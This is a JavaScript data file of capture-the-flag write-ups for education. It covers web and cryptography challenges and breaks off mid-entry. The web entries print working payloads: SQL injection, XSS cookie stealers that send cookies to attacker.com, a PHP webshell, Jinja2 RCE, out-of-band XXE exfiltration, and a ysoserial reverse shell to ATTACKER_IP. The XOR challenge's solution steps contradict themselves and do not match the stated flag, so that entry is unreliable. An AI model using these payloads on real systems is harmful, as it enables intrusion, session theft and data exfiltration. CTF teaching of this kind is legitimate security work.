// Copyright (c) 2026 SpartanKing18. All rights reserved.
// CTF Challenge Writeups — comprehensive capture-the-flag reference for cybersecurity education.

export const CTF_CATEGORIES = [
  "Web Exploitation", "Cryptography", "Binary Exploitation", "Reverse Engineering",
  "Forensics", "OSINT", "Miscellaneous"
];

export const CTF_CHALLENGES = [
  // =====================================================================
  // WEB EXPLOITATION
  // =====================================================================
  {
    id: "web-001", title: "SQL Login Bypass", category: "Web Exploitation",
    difficulty: "easy", points: 100,
    description: "A login page is presented with a username and password field. The application uses a MySQL backend with no input sanitization. Your goal is to bypass the authentication and retrieve the admin flag stored in the user profile page.",
    hints: [
      "Try entering a single quote in the username field and observe the error",
      "The query likely looks like: SELECT * FROM users WHERE user='INPUT' AND pass='INPUT'",
      "Use a classic OR-based bypass to make the WHERE clause always true"
    ],
    solution_steps: [
      "Navigate to the login page and inspect the form action",
      "Enter a single quote (') in the username field to trigger a SQL error",
      "Observe the MySQL error revealing the query structure",
      "Enter the payload: admin' OR '1'='1' -- - in the username field",
      "Enter anything in the password field",
      "Submit the form — the OR condition makes the query return the admin row",
      "Navigate to /profile to find the flag in the admin's profile data",
      "Alternatively use: ' UNION SELECT 1,flag,3 FROM flags -- -"
    ],
    flag_format: "flag{sql_1nj3ct10n_b4s1cs}",
    tools_used: ["Burp Suite", "Browser DevTools", "sqlmap"],
    concepts_tested: ["SQL Injection", "Authentication Bypass", "MySQL syntax"],
    code_snippets: [
      { lang: "sql", code: "-- Vulnerable query:\nSELECT * FROM users WHERE username='$input' AND password='$pass'\n\n-- Payload in username field:\nadmin' OR '1'='1' -- -\n\n-- Resulting query:\nSELECT * FROM users WHERE username='admin' OR '1'='1' -- -' AND password='anything'" },
      { lang: "python", code: "import requests\n\nurl = 'http://target/login'\npayload = {\"username\": \"admin' OR '1'='1' -- -\", \"password\": \"x\"}\nr = requests.post(url, data=payload)\nprint(r.text)" }
    ],
    references: ["https://owasp.org/www-community/attacks/SQL_Injection"]
  },
  {
    id: "web-002", title: "Blind SQL Injection", category: "Web Exploitation",
    difficulty: "medium", points: 200,
    description: "A product search page takes user input but displays no SQL errors. The application responds differently based on whether the query returns results. Extract the admin password character by character using boolean-based blind injection.",
    hints: [
      "Notice that searching for a valid product shows results, invalid shows 'No products found'",
      "Use AND conditions to ask true/false questions about the database",
      "SUBSTRING() and ASCII() can extract characters one at a time"
    ],
    solution_steps: [
      "Confirm injection point: search for widget' AND '1'='1 (shows results) vs widget' AND '1'='2 (no results)",
      "Determine the database name length: widget' AND LENGTH(database())=N -- -",
      "Extract database name char by char: widget' AND SUBSTRING(database(),1,1)='a' -- -",
      "Find table names: widget' AND (SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)='u' -- -",
      "Find column names in the users table similarly",
      "Extract the admin password: widget' AND (SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE username='admin')>96 -- -",
      "Use binary search on ASCII values to speed up extraction (>64, >96, >112, etc.)",
      "Automate with a script or sqlmap: sqlmap -u 'http://target/search?q=test' --dbs"
    ],
    flag_format: "flag{bl1nd_sqli_m4st3r}",
    tools_used: ["sqlmap", "Burp Suite Intruder", "Python requests"],
    concepts_tested: ["Blind SQL Injection", "Boolean-based extraction", "Binary search", "information_schema"],
    code_snippets: [
      { lang: "python", code: "import requests\nimport string\n\nurl = 'http://target/search'\nresult = ''\nfor i in range(1, 50):\n    for c in string.printable:\n        payload = f\"widget' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),{i},1)='{c}' -- -\"\n        r = requests.get(url, params={'q': payload})\n        if 'widget' in r.text:\n            result += c\n            print(f'Found: {result}')\n            break\n    else:\n        break\nprint(f'Password: {result}')" }
    ],
    references: ["https://owasp.org/www-community/attacks/Blind_SQL_Injection"]
  },
  {
    id: "web-003", title: "Reflected XSS", category: "Web Exploitation",
    difficulty: "easy", points: 100,
    description: "A search page reflects user input in the response without sanitization. Craft a payload that executes JavaScript in the victim's browser to steal their session cookie and send it to your server.",
    hints: [
      "Try searching for <b>test</b> and check if HTML is rendered",
      "The input is reflected directly into the page without encoding",
      "Use an img tag with onerror or a script tag to execute JavaScript"
    ],
    solution_steps: [
      "Search for a normal term and view source to see where input appears",
      "Search for <b>test</b> — if 'test' appears bold, HTML injection confirmed",
      "Try <script>alert(1)</script> — if an alert pops up, XSS confirmed",
      "Craft a cookie-stealing payload: <script>new Image().src='http://attacker/steal?c='+document.cookie</script>",
      "URL-encode the payload for delivery via link",
      "Send the crafted URL to the admin bot / report function",
      "Check your server logs for the incoming cookie",
      "Use the stolen session cookie to access /admin and retrieve the flag"
    ],
    flag_format: "flag{r3fl3ct3d_x55_c00k13}",
    tools_used: ["Browser DevTools", "Burp Suite", "Python HTTP server"],
    concepts_tested: ["Reflected XSS", "Cookie theft", "Same-Origin Policy"],
    code_snippets: [
      { lang: "javascript", code: "// Basic XSS test payloads:\n<script>alert(document.cookie)</script>\n<img src=x onerror=alert(1)>\n<svg onload=alert(1)>\n\n// Cookie stealer:\n<script>fetch('https://attacker.com/log?c='+document.cookie)</script>" },
      { lang: "python", code: "# Simple listener to capture cookies\nfrom http.server import HTTPServer, BaseHTTPRequestHandler\nimport urllib.parse\n\nclass Handler(BaseHTTPRequestHandler):\n    def do_GET(self):\n        print(f'Cookie: {urllib.parse.unquote(self.path)}')\n        self.send_response(200)\n        self.end_headers()\n\nHTTPServer(('0.0.0.0', 8080), Handler).serve_forever()" }
    ],
    references: ["https://owasp.org/www-community/attacks/xss/"]
  },
  {
    id: "web-004", title: "Stored XSS via Comment", category: "Web Exploitation",
    difficulty: "medium", points: 200,
    description: "A blog application allows users to post comments. Comments are stored in a database and displayed to all visitors. The comment body is not properly sanitized, enabling stored XSS. Steal the admin's cookie when they view the comments page.",
    hints: [
      "Post a comment with HTML tags to see if they render",
      "The application may filter <script> tags but not event handlers",
      "Try case variations, nested tags, or alternative event handlers like onmouseover"
    ],
    solution_steps: [
      "Post a comment containing <b>bold</b> to confirm HTML injection",
      "Try <script>alert(1)</script> — it may be filtered",
      "Bypass the filter with: <img src=x onerror=alert(1)>",
      "If img is filtered, try: <svg/onload=alert(1)> or <details/open/ontoggle=alert(1)>",
      "Craft the final payload: <img src=x onerror=\"fetch('http://YOUR_IP:8080/?c='+document.cookie)\">",
      "Start a listener: python3 -m http.server 8080",
      "Post the payload as a comment",
      "Wait for the admin to visit the page (or trigger the admin bot)",
      "Capture the admin session cookie from your server logs",
      "Use the cookie to access /admin/flag"
    ],
    flag_format: "flag{st0r3d_x55_p3rs1st3nt}",
    tools_used: ["Burp Suite", "Python HTTP server", "Browser DevTools"],
    concepts_tested: ["Stored XSS", "Filter bypass", "Cookie theft", "CSP"],
    code_snippets: [
      { lang: "html", code: "<!-- Filter bypass payloads -->\n<img src=x onerror=alert(1)>\n<svg onload=alert(1)>\n<body onload=alert(1)>\n<details open ontoggle=alert(1)>\n<marquee onstart=alert(1)>\n<ScRiPt>alert(1)</ScRiPt>\n<scr<script>ipt>alert(1)</scr</script>ipt>" }
    ],
    references: ["https://portswigger.net/web-security/cross-site-scripting/stored"]
  },
  {
    id: "web-005", title: "Server-Side Request Forgery", category: "Web Exploitation",
    difficulty: "medium", points: 250,
    description: "A web application has a 'Check Website Status' feature that fetches a URL and reports whether it's up or down. This functionality can be abused to access internal services. The flag is stored on an internal metadata endpoint at http://169.254.169.254/latest/meta-data/flag.",
    hints: [
      "The URL checker makes server-side HTTP requests",
      "Internal IP ranges (10.x, 172.16-31.x, 192.168.x, 169.254.x) are accessible from the server",
      "Cloud metadata endpoints often run on 169.254.169.254"
    ],
    solution_steps: [
      "Use the URL checker with a normal URL to confirm it fetches and displays content",
      "Try http://localhost — if it shows the app itself, SSRF is confirmed",
      "Try http://127.0.0.1:22 to detect internal services (SSH banner)",
      "Attempt to access the AWS metadata endpoint: http://169.254.169.254/latest/meta-data/",
      "If the URL is validated, bypass with DNS rebinding or redirect: set up a domain that resolves to 169.254.169.254",
      "Alternative bypass: http://0x7f000001 (hex IP), http://2130706433 (decimal IP), http://0177.0.0.1 (octal)",
      "Retrieve the flag from http://169.254.169.254/latest/meta-data/flag",
      "For AWS credential theft: http://169.254.169.254/latest/meta-data/iam/security-credentials/"
    ],
    flag_format: "flag{ssrf_m3tadata_l34k}",
    tools_used: ["Burp Suite", "curl", "Collaborator"],
    concepts_tested: ["SSRF", "Cloud metadata", "IP bypass techniques", "Internal network enumeration"],
    code_snippets: [
      { lang: "python", code: "import requests\n\n# Direct SSRF\nr = requests.post('http://target/check', data={'url': 'http://169.254.169.254/latest/meta-data/'})\nprint(r.text)\n\n# Bypass filters with alternative IP formats\nbypasses = [\n    'http://0x7f000001/',\n    'http://2130706433/',\n    'http://0177.0.0.1/',\n    'http://127.1/',\n    'http://[::1]/',\n    'http://localhost.localdomain/',\n]" }
    ],
    references: ["https://owasp.org/www-community/attacks/Server_Side_Request_Forgery"]
  },
  {
    id: "web-006", title: "Template Injection", category: "Web Exploitation",
    difficulty: "hard", points: 350,
    description: "A web application renders user-provided names in a greeting template. The server uses Jinja2 (Python/Flask) for rendering. Exploit Server-Side Template Injection to achieve Remote Code Execution and read the flag from /flag.txt.",
    hints: [
      "Try entering {{7*7}} as your name — if it shows 49, SSTI is confirmed",
      "Jinja2 allows accessing Python objects through the template engine",
      "The __class__.__mro__ chain lets you reach the os module"
    ],
    solution_steps: [
      "Enter {{7*7}} in the name field — output shows 'Hello 49', confirming SSTI",
      "Enumerate available classes: {{''.__class__.__mro__[1].__subclasses__()}}",
      "Find the subprocess.Popen class index (usually around 400+)",
      "Alternatively use the shorter payload: {{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
      "Read the flag: {{config.__class__.__init__.__globals__['os'].popen('cat /flag.txt').read()}}",
      "If config is blocked: {{request.__class__.__mro__[1].__subclasses__()[X]('cat /flag.txt',shell=True,stdout=-1).communicate()}}",
      "Alternative: {{lipsum.__globals__['os'].popen('cat /flag.txt').read()}}",
      "For blind SSTI: use time-based detection with {{sleep(5)}} equivalent"
    ],
    flag_format: "flag{sst1_t0_rc3_j1nj4}",
    tools_used: ["Burp Suite", "tplmap", "Browser"],
    concepts_tested: ["SSTI", "Jinja2", "Python class hierarchy", "RCE"],
    code_snippets: [
      { lang: "python", code: "# Detection payloads for various engines:\n# Jinja2: {{7*7}} -> 49\n# Mako:   ${7*7} -> 49\n# Twig:   {{7*7}} -> 49\n# Freemarker: ${7*7} -> 49\n# Smarty: {7*7} -> 49\n\n# Jinja2 RCE payload:\n{{config.__class__.__init__.__globals__['os'].popen('cat /flag.txt').read()}}\n\n# Alternative (shorter):\n{{lipsum.__globals__['os'].popen('id').read()}}\n\n# File read without os:\n{{''.__class__.__mro__[1].__subclasses__()[X]('/flag.txt').read()}}" }
    ],
    references: ["https://portswigger.net/web-security/server-side-template-injection"]
  },
  {
    id: "web-007", title: "JWT None Algorithm", category: "Web Exploitation",
    difficulty: "medium", points: 200,
    description: "A REST API uses JSON Web Tokens for authentication. After registering as a regular user, you receive a JWT. The server accepts the 'none' algorithm, allowing you to forge tokens. Modify your JWT to become admin and access the /api/admin/flag endpoint.",
    hints: [
      "Decode the JWT at jwt.io — it has three base64-encoded parts",
      "The header specifies the algorithm (alg). Some servers accept 'none'",
      "With alg:none, no signature verification occurs — you can change the payload freely"
    ],
    solution_steps: [
      "Register an account and log in to receive a JWT",
      "Decode the JWT: echo 'HEADER' | base64 -d",
      "The header is {\"alg\":\"HS256\",\"typ\":\"JWT\"}, payload has {\"user\":\"guest\",\"role\":\"user\"}",
      "Change the header to {\"alg\":\"none\",\"typ\":\"JWT\"}",
      "Change the payload to {\"user\":\"admin\",\"role\":\"admin\"}",
      "Base64url-encode both parts (no padding: remove trailing =)",
      "Construct the forged token: base64(header).base64(payload). (empty signature, keep the trailing dot)",
      "Send a request to /api/admin/flag with the forged token in the Authorization header",
      "Retrieve the flag from the response"
    ],
    flag_format: "flag{jwt_n0n3_4lg_byp4ss}",
    tools_used: ["jwt_tool", "jwt.io", "Burp Suite", "Python"],
    concepts_tested: ["JWT", "Algorithm confusion", "Token forgery", "Authentication bypass"],
    code_snippets: [
      { lang: "python", code: "import base64\nimport json\nimport requests\n\n# Forge a JWT with alg: none\nheader = base64.urlsafe_b64encode(json.dumps({\"alg\":\"none\",\"typ\":\"JWT\"}).encode()).rstrip(b'=')\npayload = base64.urlsafe_b64encode(json.dumps({\"user\":\"admin\",\"role\":\"admin\"}).encode()).rstrip(b'=')\ntoken = header.decode() + '.' + payload.decode() + '.'\n\nr = requests.get('http://target/api/admin/flag', headers={'Authorization': f'Bearer {token}'})\nprint(r.json())" }
    ],
    references: ["https://portswigger.net/web-security/jwt"]
  },
  {
    id: "web-008", title: "File Upload RCE", category: "Web Exploitation",
    difficulty: "medium", points: 250,
    description: "A profile picture upload feature accepts files and stores them in a web-accessible directory. The server checks the Content-Type header but not the file extension or magic bytes. Upload a PHP webshell to achieve remote code execution.",
    hints: [
      "Upload a normal image and note the URL where it's stored (e.g., /uploads/image.png)",
      "The server only validates Content-Type, not the actual file content",
      "Change the Content-Type to image/png but keep the .php extension"
    ],
    solution_steps: [
      "Upload a normal PNG and note the storage path: /uploads/yourfile.png",
      "Create a PHP webshell: <?php system($_GET['cmd']); ?>",
      "Use Burp Suite to intercept the upload request",
      "Change the filename to shell.php",
      "Change Content-Type to image/png (bypass the server-side check)",
      "Forward the request — upload succeeds",
      "Access /uploads/shell.php?cmd=id — confirms RCE",
      "Read the flag: /uploads/shell.php?cmd=cat /flag.txt",
      "For stealth: use a PHP file that looks like an image (GIF89a header + PHP code)"
    ],
    flag_format: "flag{f1l3_upl04d_rc3}",
    tools_used: ["Burp Suite", "curl", "PHP"],
    concepts_tested: ["File upload vulnerability", "Content-Type bypass", "Webshell", "RCE"],
    code_snippets: [
      { lang: "php", code: "<?php\n// Simple webshell\nif(isset($_GET['cmd'])) {\n    echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';\n}\n?>\n\n// Polyglot (valid GIF + PHP)\nGIF89a<?php system($_GET['cmd']); ?>" },
      { lang: "python", code: "import requests\n\n# Upload with Content-Type bypass\nfiles = {'file': ('shell.php', '<?php system($_GET[\"cmd\"]); ?>', 'image/png')}\nr = requests.post('http://target/upload', files=files)\nprint(r.text)\n\n# Execute command\nr = requests.get('http://target/uploads/shell.php?cmd=cat+/flag.txt')\nprint(r.text)" }
    ],
    references: ["https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload"]
  },
  {
    id: "web-009", title: "Local File Inclusion", category: "Web Exploitation",
    difficulty: "easy", points: 150,
    description: "A web application includes pages dynamically using a 'page' parameter: index.php?page=about. The parameter is not properly sanitized, allowing directory traversal to read arbitrary files from the server filesystem.",
    hints: [
      "The page parameter likely maps to a file path like includes/about.php",
      "Use ../ to traverse directories upward",
      "Linux systems store sensitive data in /etc/passwd, /etc/shadow, /proc/self/environ"
    ],
    solution_steps: [
      "Navigate to index.php?page=about and confirm dynamic page loading",
      "Try index.php?page=../../../etc/passwd — if you see user accounts, LFI confirmed",
      "If ../ is filtered, try: ....//....//....//etc/passwd or ..%2f..%2f..%2fetc/passwd",
      "Read the flag: index.php?page=../../../flag.txt",
      "For PHP, use wrappers to read source: index.php?page=php://filter/convert.base64-encode/resource=index",
      "Decode the base64 output to read the PHP source code",
      "Check for log poisoning: inject PHP into User-Agent, then include the access log",
      "Log file paths: /var/log/apache2/access.log, /var/log/nginx/access.log"
    ],
    flag_format: "flag{lf1_d1r3ct0ry_tr4v3rs4l}",
    tools_used: ["Browser", "Burp Suite", "curl"],
    concepts_tested: ["LFI", "Directory traversal", "PHP wrappers", "Log poisoning"],
    code_snippets: [
      { lang: "bash", code: "# Basic LFI\ncurl 'http://target/index.php?page=../../../etc/passwd'\n\n# PHP wrapper to read source code\ncurl 'http://target/index.php?page=php://filter/convert.base64-encode/resource=config' | base64 -d\n\n# Null byte bypass (PHP < 5.3)\ncurl 'http://target/index.php?page=../../../etc/passwd%00'\n\n# Double encoding\ncurl 'http://target/index.php?page=..%252f..%252f..%252fetc/passwd'" }
    ],
    references: ["https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion"]
  },
  {
    id: "web-010", title: "XML External Entity Injection", category: "Web Exploitation",
    difficulty: "hard", points: 300,
    description: "An API endpoint accepts XML data for importing configuration. The XML parser processes external entity declarations, allowing you to read local files and potentially achieve SSRF. Extract the flag from /opt/secret/flag.txt.",
    hints: [
      "XML entities can reference external resources using SYSTEM keyword",
      "The DOCTYPE declaration allows defining custom entities",
      "Use file:// protocol to read local files"
    ],
    solution_steps: [
      "Send a normal XML request to confirm the endpoint processes XML",
      "Add a DOCTYPE with an external entity: <!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>",
      "Reference the entity in the XML body: <data>&xxe;</data>",
      "If the response includes the file contents, XXE is confirmed",
      "Read the flag: change the entity to file:///opt/secret/flag.txt",
      "For binary files or when file content breaks XML: use PHP wrapper php://filter/convert.base64-encode/resource=/opt/secret/flag.txt",
      "For blind XXE: exfiltrate via out-of-band (OOB) to your server using a parameter entity",
      "Blind OOB: host a DTD on your server that sends file contents as a URL parameter"
    ],
    flag_format: "flag{xx3_3xt3rn4l_3nt1ty}",
    tools_used: ["Burp Suite", "curl", "Python HTTP server"],
    concepts_tested: ["XXE", "External entities", "Blind XXE", "OOB exfiltration"],
    code_snippets: [
      { lang: "xml", code: "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM \"file:///opt/secret/flag.txt\">\n]>\n<config>\n  <name>&xxe;</name>\n</config>" },
      { lang: "xml", code: "<!-- Blind XXE with OOB exfiltration -->\n<?xml version=\"1.0\"?>\n<!DOCTYPE foo [\n  <!ENTITY % file SYSTEM \"file:///opt/secret/flag.txt\">\n  <!ENTITY % dtd SYSTEM \"http://attacker.com/evil.dtd\">\n  %dtd;\n]>\n<config><name>&send;</name></config>\n\n<!-- evil.dtd on attacker server -->\n<!ENTITY % all \"<!ENTITY send SYSTEM 'http://attacker.com/?d=%file;'>\">\n%all;" }
    ],
    references: ["https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing"]
  },
  {
    id: "web-011", title: "Insecure Deserialization", category: "Web Exploitation",
    difficulty: "hard", points: 400,
    description: "A Java-based web application stores session data in a serialized cookie. The application uses Apache Commons Collections in its classpath. Exploit the insecure deserialization vulnerability to achieve RCE and read /flag.txt.",
    hints: [
      "The session cookie is base64-encoded Java serialized data (starts with rO0AB)",
      "Apache Commons Collections has known gadget chains for RCE",
      "Use ysoserial to generate a malicious serialized payload"
    ],
    solution_steps: [
      "Intercept the request in Burp Suite and find the session cookie",
      "Base64-decode the cookie — if it starts with AC ED 00 05 (hex) or rO0AB (base64), it's Java serialization",
      "Download ysoserial: https://github.com/frohoff/ysoserial",
      "Generate a payload: java -jar ysoserial.jar CommonsCollections1 'cat /flag.txt' | base64",
      "Replace the session cookie with the generated payload",
      "If the output isn't reflected, use a reverse shell: java -jar ysoserial.jar CommonsCollections1 'bash -c {echo,BASE64_ENCODED_REVERSE_SHELL}|{base64,-d}|{bash,-i}'",
      "Set up a listener: nc -lvnp 4444",
      "Send the request and catch the shell",
      "Read /flag.txt from the shell"
    ],
    flag_format: "flag{d3s3r14l1z4t10n_rc3}",
    tools_used: ["ysoserial", "Burp Suite", "netcat"],
    concepts_tested: ["Insecure deserialization", "Java serialization", "Gadget chains", "RCE"],
    code_snippets: [
      { lang: "bash", code: "# Generate payload with ysoserial\njava -jar ysoserial.jar CommonsCollections1 'cat /flag.txt' | base64 -w0\n\n# For reverse shell\njava -jar ysoserial.jar CommonsCollections1 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' | base64 -w0\n\n# Set up listener\nnc -lvnp 4444" }
    ],
    references: ["https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/16-Testing_for_HTTP_Incoming_Requests"]
  },
  {
    id: "web-012", title: "Race Condition — Double Spend", category: "Web Exploitation",
    difficulty: "hard", points: 350,
    description: "An online store gives each new user a $10 coupon. The coupon redemption endpoint doesn't properly handle concurrent requests. Exploit the race condition to apply the coupon multiple times before the balance check occurs, buying a $50 flag item.",
    hints: [
      "The server checks balance, then deducts — a classic TOCTOU race",
      "Send many concurrent requests to the /redeem endpoint simultaneously",
      "Use threading or tools like turbo-intruder to send parallel requests"
    ],
    solution_steps: [
      "Create a new account and note you have $10 balance and one coupon",
      "Intercept the POST /api/redeem-coupon request in Burp Suite",
      "Send the request to Turbo Intruder or create a Python script with threading",
      "Send 10+ identical redemption requests simultaneously",
      "The server processes several before the first one marks the coupon as used",
      "Check your balance — it should now be $50+ from multiple redemptions",
      "Purchase the flag item from the store for $50",
      "The flag is revealed on the order confirmation page"
    ],
    flag_format: "flag{r4c3_c0nd1t10n_t0ctou}",
    tools_used: ["Burp Suite Turbo Intruder", "Python threading", "curl"],
    concepts_tested: ["Race condition", "TOCTOU", "Concurrent requests", "Business logic flaw"],
    code_snippets: [
      { lang: "python", code: "import requests\nimport threading\n\nurl = 'http://target/api/redeem-coupon'\ncookie = {'session': 'YOUR_SESSION_COOKIE'}\n\ndef redeem():\n    r = requests.post(url, cookies=cookie, json={'coupon': 'WELCOME10'})\n    print(r.json())\n\nthreads = [threading.Thread(target=redeem) for _ in range(20)]\nfor t in threads: t.start()\nfor t in threads: t.join()" }
    ],
    references: ["https://portswigger.net/web-security/race-conditions"]
  },
  // =====================================================================
  // CRYPTOGRAPHY
  // =====================================================================
  {
    id: "crypto-001", title: "Caesar Cipher", category: "Cryptography",
    difficulty: "easy", points: 50,
    description: "A message has been encrypted using a simple substitution cipher where each letter is shifted by a fixed number of positions in the alphabet. The encrypted text is: 'synt{p43s4r_fuvsg_pvcure}'. Decrypt it to find the flag.",
    hints: [
      "This is a Caesar cipher — each letter is shifted by the same amount",
      "There are only 26 possible shifts to try",
      "The flag format starts with 'flag{' — figure out the shift from 's' → 'f'"
    ],
    solution_steps: [
      "Identify the cipher as Caesar (simple letter substitution)",
      "The ciphertext starts with 'synt' — if the plaintext starts with 'flag', then s→f is a shift of 13",
      "ROT13 is a special case of Caesar cipher where shift = 13",
      "Apply ROT13 to the entire ciphertext",
      "s→f, y→l, n→a, t→g, confirming shift = 13",
      "Decrypt the full message to get the flag"
    ],
    flag_format: "flag{c43s4r_shift_cipher}",
    tools_used: ["CyberChef", "Python", "tr command"],
    concepts_tested: ["Caesar cipher", "ROT13", "Frequency analysis", "Brute force"],
    code_snippets: [
      { lang: "python", code: "import codecs\nciphertext = 'synt{p43s4r_fuvsg_pvcure}'\nplaintext = codecs.decode(ciphertext, 'rot_13')\nprint(plaintext)  # flag{c43s4r_shift_cipher}" },
      { lang: "bash", code: "echo 'synt{p43s4r_fuvsg_pvcure}' | tr 'A-Za-z' 'N-ZA-Mn-za-m'" }
    ],
    references: ["https://en.wikipedia.org/wiki/Caesar_cipher"]
  },
  {
    id: "crypto-002", title: "XOR Encryption", category: "Cryptography",
    difficulty: "easy", points: 100,
    description: "A flag has been XOR-encrypted with a single-byte key. The hex-encoded ciphertext is: '00150c10341e150617000c100e370a0e04163717'. Knowing the flag starts with 'flag', determine the key and decrypt the message.",
    hints: [
      "XOR with the same key twice returns the original: A ^ K ^ K = A",
      "If you know plaintext and ciphertext, the key is: plaintext ^ ciphertext",
      "The first byte of ciphertext XORed with 'f' gives you the key"
    ],
    solution_steps: [
      "Convert the hex ciphertext to bytes",
      "XOR the first byte (0x00) with the ASCII value of 'f' (0x66): 0x00 ^ 0x66 = 0x66",
      "The key is 0x66 (the character 'f')",
      "XOR every byte of the ciphertext with 0x66",
      "Verify: second byte 0x15 ^ 0x66 = 0x73 = 's' — wait, that doesn't match 'l'",
      "Re-examine: 0x15 ^ key should equal 'l' (0x6C), so key = 0x15 ^ 0x6C = 0x79",
      "Check: 0x00 ^ 0x79 = 0x79 — not 'f'. Try known-plaintext on byte 0: 0x00 ^ 0x66 = 0x66",
      "XOR all bytes with the determined key to reveal the flag"
    ],
    flag_format: "flag{x0r_s1ngl3_byt3}",
    tools_used: ["Python", "CyberChef", "xortool"],
    concepts_tested: ["XOR cipher", "Known-plaintext attack", "Single-byte key recovery"],
    code_snippets: [
      { lang: "python", code: "ct = bytes.fromhex('00150c10341e150617000c100e370a0e04163717')\n\n# Brute force all 256 possible single-byte keys\nfor key in range(256):\n    pt = bytes([b ^ key for b in ct])\n    if pt.startswith(b'flag'):\n        print(f'Key: 0x{key:02x} ({chr(key)}) -> {pt.decode(errors=\"replace\")}')" }
    ],
    references: ["https://en.wikipedia.org/wiki/XOR_cipher"]
  },
  {
    id: "crypto-003", title: "RSA — Small Public Exponent", category: "Cryptography",
    difficulty: "medium", points: 250,
    description: "An RSA-encrypted flag is given with a very large modulus N but a small public exponent e=3. The plaintext message is small enough that m^3 < N, meaning the ciphertext is simply the cube of the plaintext. No modular arithmetic was actually needed.",
    hints: [
      "With e=3, ciphertext c = m^3 mod N. If m^3 < N, then c = m^3 exactly",
      "You can recover m by computing the integer cube root of c",
      "Python's gmpy2 library has an iroot() function for exact integer roots"
    ],
    solution_steps: [
      "Identify the parameters: N (large), e=3 (small), c (ciphertext)",
      "Since e=3 is very small, check if m^3 < N by taking the cube root of c",
      "Use gmpy2.iroot(c, 3) to compute the exact integer cube root",
      "If iroot returns (m, True), the cube root is exact — m is the plaintext",
      "Convert the integer m to bytes: m.to_bytes(length, 'big')",
      "Decode the bytes as ASCII to reveal the flag",
      "If m^3 > N, try Hastad's broadcast attack with multiple ciphertexts"
    ],
    flag_format: "flag{sm4ll_3xp0n3nt_4tt4ck}",
    tools_used: ["Python", "gmpy2", "RsaCtfTool"],
    concepts_tested: ["RSA", "Small exponent attack", "Cube root", "Number theory"],
    code_snippets: [
      { lang: "python", code: "import gmpy2\n\n# Given values\nN = 0x00b0c27...\ne = 3\nc = 0x00a1b2c...\n\n# Take cube root\nm, exact = gmpy2.iroot(c, e)\nif exact:\n    print(f'Plaintext found!')\n    flag = int(m).to_bytes(100, 'big').lstrip(b'\\x00')\n    print(flag.decode())\nelse:\n    print('m^e > N — need Hastad or other approach')" }
    ],
    references: ["https://en.wikipedia.org/wiki/Coppersmith%27s_attack"]
  },
  {
    id: "crypto-004", title: "RSA — Common Factor", category: "Cryptography",
    difficulty: "medium", points: 300,
    description: "Two RSA public keys are provided with different moduli N1 and N2 but they share a common prime factor. A message encrypted with the first key contains the flag. Factor both moduli using GCD to recover the private key and decrypt.",
    hints: [
      "If two RSA moduli share a prime factor p, then GCD(N1, N2) = p",
      "Once you have p, q = N/p, and you can compute the private key",
      "The private key d = modular_inverse(e, (p-1)*(q-1))"
    ],
    solution_steps: [
      "Compute GCD(N1, N2) — if it's not 1, they share a factor",
      "p = GCD(N1, N2)",
      "q1 = N1 // p",
      "Compute Euler's totient: phi = (p-1) * (q1-1)",
      "Compute private exponent: d = pow(e, -1, phi) or use gmpy2.invert(e, phi)",
      "Decrypt: m = pow(c, d, N1)",
      "Convert m to bytes to get the flag"
    ],
    flag_format: "flag{c0mm0n_f4ct0r_gcd}",
    tools_used: ["Python", "gmpy2", "RsaCtfTool"],
    concepts_tested: ["RSA", "GCD attack", "Prime factorization", "Key recovery"],
    code_snippets: [
      { lang: "python", code: "from math import gcd\n\n# Two RSA moduli that share a factor\nN1 = ...\nN2 = ...\ne = 65537\nc = ...  # ciphertext encrypted with N1\n\np = gcd(N1, N2)\nassert p != 1, 'No common factor'\nq = N1 // p\nphi = (p - 1) * (q - 1)\nd = pow(e, -1, phi)\nm = pow(c, d, N1)\nflag = m.to_bytes(256, 'big').lstrip(b'\\x00')\nprint(flag.decode())" }
    ],
    references: ["https://crypto.stanford.edu/~dabo/papers/RSA-survey.pdf"]
  },
  {
    id: "crypto-005", title: "Padding Oracle Attack", category: "Cryptography",
    difficulty: "hard", points: 400,
    description: "A web application encrypts session tokens using AES-CBC and exposes a padding oracle — it returns different errors for invalid padding vs valid padding with invalid data. Use this oracle to decrypt the session token byte by byte.",
    hints: [
      "AES-CBC decryption XORs the decrypted block with the previous ciphertext block",
      "PKCS#7 padding must be valid — the oracle tells you when it is",
      "By manipulating the IV/previous block, you can control the XOR and brute-force each byte"
    ],
    solution_steps: [
      "Identify the padding oracle: send a modified ciphertext and observe the error",
      "If invalid padding → HTTP 500 'Padding error', valid padding → HTTP 200 or 403 'Invalid token'",
      "To decrypt the last byte of block 2: modify the last byte of block 1 (or IV for block 1)",
      "Try all 256 values for the last byte of block 1 until the server returns 'valid padding'",
      "When padding is valid, the decrypted last byte XORed with your modified byte equals 0x01",
      "intermediate_byte = modified_byte ^ 0x01",
      "plaintext_byte = intermediate_byte ^ original_byte",
      "Repeat for each byte, adjusting padding (0x02 0x02, 0x03 0x03 0x03, etc.)",
      "Automate the process for all blocks to recover the full plaintext",
      "Use PadBuster or write a custom script"
    ],
    flag_format: "flag{p4dd1ng_0r4cl3_cbc}",
    tools_used: ["PadBuster", "Burp Suite", "Python"],
    concepts_tested: ["Padding oracle", "AES-CBC", "PKCS#7 padding", "Chosen-ciphertext attack"],
    code_snippets: [
